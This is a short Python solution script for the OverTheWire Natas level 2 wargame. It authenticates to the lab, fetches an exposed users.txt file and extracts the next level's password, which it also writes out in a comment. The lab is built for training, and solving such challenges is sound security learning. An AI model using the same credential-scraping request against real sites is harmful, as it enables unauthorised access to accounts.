import requests
import re

url = 'http://natas2.natas.labs.overthewire.org/files/users.txt'
auth = requests.auth.HTTPBasicAuth('natas2', 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi')
response = requests.get(url, auth=auth)
password = re.findall('natas3:(.*)', response.text)
print(password[0]) # sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

